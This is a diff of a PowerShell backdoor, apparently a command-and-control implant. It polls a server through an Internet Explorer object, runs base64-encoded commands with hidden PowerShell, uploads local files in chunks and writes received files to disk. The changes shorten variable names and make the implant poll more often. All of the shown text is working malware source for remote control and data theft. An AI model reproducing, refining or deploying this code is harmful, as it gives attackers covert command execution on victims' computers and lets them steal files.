@@ -1,5 +1,5 @@
-$CHUNK_SIZE = 35000;
-$SIZE_LIMIT = 8500000;
+$CHUNK = 35000;
+$LIMIT = 8500000;
 $SRV = '';
 
 function get {
@@ -19,21 +19,21 @@ function post {
 
 function run {
   param($s, $ie);
-  $type = get $ie 'TxR' $s;
-  if ($type -ne '0') {
-    $col = 3;
-    $buf = New-Object Collections.ArrayList;
+  $tp = get $ie 'TxR' $s;
+  if ($tp -ne '0') {
+    $c = 3;
+    $b = New-Object Collections.ArrayList;
     while (1) {
-      $d = get $ie 'TxD' ($s + '|' + $col);
+      $d = get $ie 'TxD' ($s + '|' + $c);
       if ($d -eq $null) {
         break;
       }
-      $buf.add($d) | out-null;
-      $col++;
+      $b.add($d) | out-null;
+      $c++;
     }
     post $ie 'Tx' ($s + '|2') '0';
-    if ($type -eq '@') {
-      $xc = $buf -join '';
+    if ($tp -eq '@') {
+      $xc = $b -join '';
       $xc = $xc | out-string;
       $r = powershell.exe -nopr -noni -enc $xc;
       if ($r -eq $null) {
@@ -42,25 +42,25 @@ function run {
         $r = $r | out-string;
       }
       $r = $r.ToCharArray();
-    } elseif ($type -eq '^') {
-      $r = [IO.file]::ReadAllBytes([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($buf -join '')));
-      if ($r.length -ge $SIZE_LIMIT) {
+    } elseif ($tp -eq '^') {
+      $r = [IO.file]::ReadAllBytes([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b -join '')));
+      if ($r.length -ge $LIMIT) {
         $r = '';
       }
     } else {
-      [IO.file]::WriteAllBytes("$type", [Convert]::FromBase64String($buf -join ''));
+      [IO.file]::WriteAllBytes("$tp", [Convert]::FromBase64String($b -join ''));
       $r = 'NULL'.ToCharArray();
     }
-    $col = 3;
+    $c = 3;
     $i = 0;
-    while ($i -le ($r.length - $CHUNK_SIZE)) {
-      $x = [Convert]::ToBase64String($r[$i..($i + $CHUNK_SIZE - 1)]);
-      post $ie 'Rx' ($s + '|' + $col) $x;
-      $i += $CHUNK_SIZE;
-      $col++;
+    while ($i -le ($r.length - $CHUNK)) {
+      $x = [Convert]::ToBase64String($r[$i..($i + $CHUNK - 1)]);
+      post $ie 'Rx' ($s + '|' + $c) $x;
+      $i += $CHUNK;
+      $c++;
     }
     $x = [Convert]::ToBase64String($r[$i..($r.length - 1)]);
-    post $ie 'Rx' ($s + '|' + $col) $x;
+    post $ie 'Rx' ($s + '|' + $c) $x;
     post $ie 'Rx' ($s + '|2') '1';
   }
 }
@@ -74,8 +74,8 @@ while (1) {
     $s = $ip.ipaddress[0] + '|' + $env:USERNAME;
     while (1) {
       run $s $ie;
-      $delay = Get-Random -InputObject 5, 6, 7, 8, 9, 10;
-      sleep -seconds $delay;
+      $d = Get-Random -InputObject 1, 2, 3;
+      sleep -seconds $d;
       $ie.stop();
     }
   } catch {
